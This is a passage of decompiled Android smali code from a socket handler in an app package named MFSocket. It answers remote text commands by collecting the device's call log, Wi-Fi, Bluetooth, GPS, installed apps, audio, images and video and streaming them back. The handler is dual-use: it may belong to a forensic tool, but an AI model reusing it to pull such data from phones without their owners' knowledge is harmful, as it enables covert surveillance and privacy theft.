    .line 164
    .restart local v6    # "cNum1":C
    const/16 v24, 0x1

    invoke-virtual/range {v23 .. v24}, Ljava/lang/String;->charAt(I)C
    :try_end_e
    .catch Ljava/lang/Exception; {:try_start_e .. :try_end_e} :catch_3
    .catchall {:try_start_e .. :try_end_e} :catchall_0

    move-result v7

    .line 165
    .restart local v7    # "cNum2":C
    const/16 v24, 0x30

    move/from16 v0, v24

    if-lt v6, v0, :cond_a

    const/16 v24, 0x39

    move/from16 v0, v24

    if-gt v6, v0, :cond_a

    const/16 v24, 0x30

    move/from16 v0, v24

    if-lt v7, v0, :cond_a

    const/16 v24, 0x39

    move/from16 v0, v24

    if-gt v7, v0, :cond_a

    .line 167
    :try_start_f
    invoke-static/range {v23 .. v23}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I
    :try_end_f
    .catch Ljava/lang/Exception; {:try_start_f .. :try_end_f} :catch_6
    .catchall {:try_start_f .. :try_end_f} :catchall_0

    move-result v16

    .line 171
    :goto_5
    if-lez v16, :cond_9

    const/16 v24, 0x64

    move/from16 v0, v16

    move/from16 v1, v24

    if-lt v0, v1, :cond_a

    .line 172
    :cond_9
    const/16 v16, 0x1

    .line 175
    :cond_a
    :try_start_10
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/Android/MFSocket/SocketTrans;->activity:Lcom/Android/MFSocket/MFSocket;

    move-object/from16 v24, v0

    move-object/from16 v0, v24

    move-object/from16 v1, v17

    move-object/from16 v2, v22

    move/from16 v3, v16

    invoke-virtual {v0, v1, v2, v3}, Lcom/Android/MFSocket/MFSocket;->getCallLog(Ljava/io/BufferedOutputStream;Ljava/lang/StringBuffer;I)V

    goto/16 :goto_2

    .line 168
    :catch_6
    move-exception v10

    .line 169
    .restart local v10    # "e":Ljava/lang/Exception;
    const/16 v16, 0x1

    goto :goto_5

    .line 176
    .end local v6    # "cNum1":C
    .end local v7    # "cNum2":C
    .end local v10    # "e":Ljava/lang/Exception;
    .end local v16    # "nOneTimeCount":I
    .end local v23    # "strOneTime":Ljava/lang/String;
    :cond_b
    const/16 v24, 0x0

    const-string v25, "4500_REQUEST_WIFI"

    invoke-virtual/range {v25 .. v25}, Ljava/lang/String;->length()I

    move-result v25

    move-object/from16 v0, v19

    move/from16 v1, v24

    move/from16 v2, v25

    invoke-virtual {v0, v1, v2}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v24

    const-string v25, "4500_REQUEST_WIFI"

    invoke-virtual/range {v24 .. v25}, Ljava/lang/String;->compareToIgnoreCase(Ljava/lang/String;)I

    move-result v24

    if-nez v24, :cond_c

    .line 177
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/Android/MFSocket/SocketTrans;->activity:Lcom/Android/MFSocket/MFSocket;

    move-object/from16 v24, v0

    move-object/from16 v0, v24

    move-object/from16 v1, v22

    invoke-virtual {v0, v1}, Lcom/Android/MFSocket/MFSocket;->getWifi(Ljava/lang/StringBuffer;)V

    goto/16 :goto_2

    .line 178
    :cond_c
    const/16 v24, 0x0

    const-string v25, "4500_REQUEST_BT"

    invoke-virtual/range {v25 .. v25}, Ljava/lang/String;->length()I

    move-result v25

    move-object/from16 v0, v19

    move/from16 v1, v24

    move/from16 v2, v25

    invoke-virtual {v0, v1, v2}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v24

    const-string v25, "4500_REQUEST_BT"

    invoke-virtual/range {v24 .. v25}, Ljava/lang/String;->compareToIgnoreCase(Ljava/lang/String;)I

    move-result v24

    if-nez v24, :cond_d

    .line 180
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/Android/MFSocket/SocketTrans;->activity:Lcom/Android/MFSocket/MFSocket;

    move-object/from16 v24, v0

    move-object/from16 v0, v24

    move-object/from16 v1, v22

    invoke-virtual {v0, v1}, Lcom/Android/MFSocket/MFSocket;->getBt(Ljava/lang/StringBuffer;)V

    goto/16 :goto_2

    .line 181
    :cond_d
    const/16 v24, 0x0

    const-string v25, "4500_REQUEST_GPS"

    invoke-virtual/range {v25 .. v25}, Ljava/lang/String;->length()I

    move-result v25

    move-object/from16 v0, v19

    move/from16 v1, v24

    move/from16 v2, v25

    invoke-virtual {v0, v1, v2}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v24

    const-string v25, "4500_REQUEST_GPS"

    invoke-virtual/range {v24 .. v25}, Ljava/lang/String;->compareToIgnoreCase(Ljava/lang/String;)I

    move-result v24

    if-nez v24, :cond_e

    .line 182
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/Android/MFSocket/SocketTrans;->activity:Lcom/Android/MFSocket/MFSocket;

    move-object/from16 v24, v0

    move-object/from16 v0, v24

    move-object/from16 v1, v22

    invoke-virtual {v0, v1}, Lcom/Android/MFSocket/MFSocket;->getGps(Ljava/lang/StringBuffer;)V

    goto/16 :goto_2

    .line 183
    :cond_e
    const/16 v24, 0x0

    const-string v25, "4500_REQUEST_APP"

    invoke-virtual/range {v25 .. v25}, Ljava/lang/String;->length()I

    move-result v25

    move-object/from16 v0, v19

    move/from16 v1, v24

    move/from16 v2, v25

    invoke-virtual {v0, v1, v2}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v24

    const-string v25, "4500_REQUEST_APP"

    invoke-virtual/range {v24 .. v25}, Ljava/lang/String;->compareToIgnoreCase(Ljava/lang/String;)I

    move-result v24

    if-nez v24, :cond_f

    .line 184
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/Android/MFSocket/SocketTrans;->activity:Lcom/Android/MFSocket/MFSocket;

    move-object/from16 v24, v0

    move-object/from16 v0, v24

    move-object/from16 v1, v22

    invoke-virtual {v0, v1}, Lcom/Android/MFSocket/MFSocket;->getAppInfo(Ljava/lang/StringBuffer;)V

    goto/16 :goto_2

    .line 185
    :cond_f
    const/16 v24, 0x0

    const-string v25, "4500_REQUEST_QUIT"

    invoke-virtual/range {v25 .. v25}, Ljava/lang/String;->length()I

    move-result v25

    move-object/from16 v0, v19

    move/from16 v1, v24

    move/from16 v2, v25

    invoke-virtual {v0, v1, v2}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v24

    const-string v25, "4500_REQUEST_QUIT"

    invoke-virtual/range {v24 .. v25}, Ljava/lang/String;->compareToIgnoreCase(Ljava/lang/String;)I

    move-result v24

    if-nez v24, :cond_10

    .line 186
    invoke-virtual {v8}, Ljava/nio/channels/ServerSocketChannel;->close()V

    .line 187
    const/4 v4, 0x1

    .line 188
    const/16 v24, 0x0

    invoke-static/range {v24 .. v24}, Ljava/lang/System;->exit(I)V

    goto/16 :goto_2

    .line 189
    :cond_10
    const/16 v24, 0x0

    const-string v25, "4500_REQUEST_AUDIO"

    invoke-virtual/range {v25 .. v25}, Ljava/lang/String;->length()I

    move-result v25

    move-object/from16 v0, v19

    move/from16 v1, v24

    move/from16 v2, v25

    invoke-virtual {v0, v1, v2}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v24

    const-string v25, "4500_REQUEST_AUDIO"

    invoke-virtual/range {v24 .. v25}, Ljava/lang/String;->compareToIgnoreCase(Ljava/lang/String;)I

    move-result v24

    if-nez v24, :cond_12

    .line 190
    const/4 v15, 0x0

    .line 191
    .local v15, "nConfig":I
    invoke-virtual/range {v19 .. v19}, Ljava/lang/String;->length()I

    move-result v24

    const-string v25, "4500_REQUEST_AUDIO"

    invoke-virtual/range {v25 .. v25}, Ljava/lang/String;->length()I

    move-result v25

    move/from16 v0, v24

    move/from16 v1, v25

    if-le v0, v1, :cond_11

    .line 192
    const-string v24, "4500_REQUEST_AUDIO"

    invoke-virtual/range {v24 .. v24}, Ljava/lang/String;->length()I

    move-result v24

    const-string v25, "4500_REQUEST_AUDIO"

    invoke-virtual/range {v25 .. v25}, Ljava/lang/String;->length()I

    move-result v25

    add-int/lit8 v25, v25, 0x1

    move-object/from16 v0, v19

    move/from16 v1, v24

    move/from16 v2, v25

    invoke-virtual {v0, v1, v2}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v21

    .line 193
    .local v21, "strConfig":Ljava/lang/String;
    const/16 v24, 0x0

    move-object/from16 v0, v21

    move/from16 v1, v24

    invoke-virtual {v0, v1}, Ljava/lang/String;->charAt(I)C
    :try_end_10
    .catch Ljava/lang/Exception; {:try_start_10 .. :try_end_10} :catch_3
    .catchall {:try_start_10 .. :try_end_10} :catchall_0

    move-result v5

    .line 194
    .local v5, "cNum":C
    const/16 v24, 0x30

    move/from16 v0, v24

    if-lt v5, v0, :cond_11

    const/16 v24, 0x39

    move/from16 v0, v24

    if-gt v5, v0, :cond_11

    .line 196
    :try_start_11
    invoke-static/range {v21 .. v21}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I
    :try_end_11
    .catch Ljava/lang/Exception; {:try_start_11 .. :try_end_11} :catch_7
    .catchall {:try_start_11 .. :try_end_11} :catchall_0

    move-result v15

    .line 202
    .end local v5    # "cNum":C
    .end local v21    # "strConfig":Ljava/lang/String;
    :cond_11
    :goto_6
    :try_start_12
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/Android/MFSocket/SocketTrans;->activity:Lcom/Android/MFSocket/MFSocket;

    move-object/from16 v24, v0

    move-object/from16 v0, v24

    move-object/from16 v1, v17

    move-object/from16 v2, v22

    invoke-virtual {v0, v1, v2, v15}, Lcom/Android/MFSocket/MFSocket;->getAudio(Ljava/io/BufferedOutputStream;Ljava/lang/StringBuffer;I)V

    goto/16 :goto_2

    .line 197
    .restart local v5    # "cNum":C
    .restart local v21    # "strConfig":Ljava/lang/String;
    :catch_7
    move-exception v10

    .line 198
    .restart local v10    # "e":Ljava/lang/Exception;
    const/4 v15, 0x0

    goto :goto_6

    .line 203
    .end local v5    # "cNum":C
    .end local v10    # "e":Ljava/lang/Exception;
    .end local v15    # "nConfig":I
    .end local v21    # "strConfig":Ljava/lang/String;
    :cond_12
    const/16 v24, 0x0

    const-string v25, "4500_REQUEST_IMAGE"

    invoke-virtual/range {v25 .. v25}, Ljava/lang/String;->length()I

    move-result v25

    move-object/from16 v0, v19

    move/from16 v1, v24

    move/from16 v2, v25

    invoke-virtual {v0, v1, v2}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v24

    const-string v25, "4500_REQUEST_IMAGE"

    invoke-virtual/range {v24 .. v25}, Ljava/lang/String;->compareToIgnoreCase(Ljava/lang/String;)I

    move-result v24

    if-nez v24, :cond_14

    .line 204
    const/4 v15, 0x0

    .line 205
    .restart local v15    # "nConfig":I
    invoke-virtual/range {v19 .. v19}, Ljava/lang/String;->length()I

    move-result v24

    const-string v25, "4500_REQUEST_IMAGE"

    invoke-virtual/range {v25 .. v25}, Ljava/lang/String;->length()I

    move-result v25

    move/from16 v0, v24

    move/from16 v1, v25

    if-le v0, v1, :cond_13

    .line 206
    const-string v24, "4500_REQUEST_IMAGE"

    invoke-virtual/range {v24 .. v24}, Ljava/lang/String;->length()I

    move-result v24

    const-string v25, "4500_REQUEST_IMAGE"

    invoke-virtual/range {v25 .. v25}, Ljava/lang/String;->length()I

    move-result v25

    add-int/lit8 v25, v25, 0x1

    move-object/from16 v0, v19

    move/from16 v1, v24

    move/from16 v2, v25

    invoke-virtual {v0, v1, v2}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v21

    .line 207
    .restart local v21    # "strConfig":Ljava/lang/String;
    const/16 v24, 0x0

    move-object/from16 v0, v21

    move/from16 v1, v24

    invoke-virtual {v0, v1}, Ljava/lang/String;->charAt(I)C
    :try_end_12
    .catch Ljava/lang/Exception; {:try_start_12 .. :try_end_12} :catch_3
    .catchall {:try_start_12 .. :try_end_12} :catchall_0

    move-result v5

    .line 208
    .restart local v5    # "cNum":C
    const/16 v24, 0x30

    move/from16 v0, v24

    if-lt v5, v0, :cond_13

    const/16 v24, 0x39

    move/from16 v0, v24

    if-gt v5, v0, :cond_13

    .line 210
    :try_start_13
    invoke-static/range {v21 .. v21}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I
    :try_end_13
    .catch Ljava/lang/Exception; {:try_start_13 .. :try_end_13} :catch_8
    .catchall {:try_start_13 .. :try_end_13} :catchall_0

    move-result v15

    .line 216
    .end local v5    # "cNum":C
    .end local v21    # "strConfig":Ljava/lang/String;
    :cond_13
    :goto_7
    :try_start_14
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/Android/MFSocket/SocketTrans;->activity:Lcom/Android/MFSocket/MFSocket;

    move-object/from16 v24, v0

    move-object/from16 v0, v24

    move-object/from16 v1, v17

    move-object/from16 v2, v22

    invoke-virtual {v0, v1, v2, v15}, Lcom/Android/MFSocket/MFSocket;->getImage(Ljava/io/BufferedOutputStream;Ljava/lang/StringBuffer;I)V

    goto/16 :goto_2

    .line 211
    .restart local v5    # "cNum":C
    .restart local v21    # "strConfig":Ljava/lang/String;
    :catch_8
    move-exception v10

    .line 212
    .restart local v10    # "e":Ljava/lang/Exception;
    const/4 v15, 0x0

    goto :goto_7

    .line 217
    .end local v5    # "cNum":C
    .end local v10    # "e":Ljava/lang/Exception;
    .end local v15    # "nConfig":I
    .end local v21    # "strConfig":Ljava/lang/String;
    :cond_14
    const/16 v24, 0x0

    const-string v25, "4500_REQUEST_VIDEO"

    invoke-virtual/range {v25 .. v25}, Ljava/lang/String;->length()I

    move-result v25

    move-object/from16 v0, v19

    move/from16 v1, v24

    move/from16 v2, v25

    invoke-virtual {v0, v1, v2}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v24

    const-string v25, "4500_REQUEST_VIDEO"

    invoke-virtual/range {v24 .. v25}, Ljava/lang/String;->compareToIgnoreCase(Ljava/lang/String;)I

    move-result v24

    if-nez v24, :cond_16

    .line 218
    const/4 v15, 0x0

    .line 219
    .restart local v15    # "nConfig":I
    invoke-virtual/range {v19 .. v19}, Ljava/lang/String;->length()I

    move-result v24

    const-string v25, "4500_REQUEST_VIDEO"

    invoke-virtual/range {v25 .. v25}, Ljava/lang/String;->length()I

    move-result v25

    move/from16 v0, v24

    move/from16 v1, v25

    if-le v0, v1, :cond_15

    .line 220
    const-string v24, "4500_REQUEST_VIDEO"

    invoke-virtual/range {v24 .. v24}, Ljava/lang/String;->length()I

    move-result v24

    const-string v25, "4500_REQUEST_VIDEO"

    invoke-virtual/range {v25 .. v25}, Ljava/lang/String;->length()I

    move-result v25

    add-int/lit8 v25, v25, 0x1

    move-object/from16 v0, v19

    move/from16 v1, v24

    move/from16 v2, v25

    invoke-virtual {v0, v1, v2}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v21

    .line 221
    .restart local v21    # "strConfig":Ljava/lang/String;
    const/16 v24, 0x0

    move-object/from16 v0, v21

    move/from16 v1, v24

    invoke-virtual {v0, v1}, Ljava/lang/String;->charAt(I)C
    :try_end_14
    .catch Ljava/lang/Exception; {:try_start_14 .. :try_end_14} :catch_3
    .catchall {:try_start_14 .. :try_end_14} :catchall_0

    move-result v5

    .line 222
    .restart local v5    # "cNum":C
    const/16 v24, 0x30

    move/from16 v0, v24

    if-lt v5, v0, :cond_15

    const/16 v24, 0x39

    move/from16 v0, v24

    if-gt v5, v0, :cond_15

    .line 224
    :try_start_15
    invoke-static/range {v21 .. v21}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I
    :try_end_15
    .catch Ljava/lang/Exception; {:try_start_15 .. :try_end_15} :catch_9
    .catchall {:try_start_15 .. :try_end_15} :catchall_0

    move-result v15

    .line 230
    .end local v5    # "cNum":C
    .end local v21    # "strConfig":Ljava/lang/String;
    :cond_15
    :goto_8
    :try_start_16
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/Android/MFSocket/SocketTrans;->activity:Lcom/Android/MFSocket/MFSocket;

    move-object/from16 v24, v0

    move-object/from16 v0, v24

    move-object/from16 v1, v17

    move-object/from16 v2, v22

    invoke-virtual {v0, v1, v2, v15}, Lcom/Android/MFSocket/MFSocket;->getVideo(Ljava/io/BufferedOutputStream;Ljava/lang/StringBuffer;I)V
    :try_end_16
    .catch Ljava/lang/Exception; {:try_start_16 .. :try_end_16} :catch_3
    .catchall {:try_start_16 .. :try_end_16} :catchall_0

    goto/16 :goto_2

    .line 225
    .restart local v5    # "cNum":C
    .restart local v21    # "strConfig":Ljava/lang/String;
    :catch_9
    move-exception v10

    .line 226
    .restart local v10    # "e":Ljava/lang/Exception;
    const/4 v15, 0x0

    goto :goto_8

    .line 243
    .end local v5    # "cNum":C
    .end local v10    # "e":Ljava/lang/Exception;
    .end local v15    # "nConfig":I
    .end local v21    # "strConfig":Ljava/lang/String;
    :cond_16
    :try_start_17
    invoke-virtual {v9}, Ljava/net/Socket;->close()V
    :try_end_17
    .catch Ljava/lang/Exception; {:try_start_17 .. :try_end_17} :catch_2

    goto/16 :goto_0
.end method
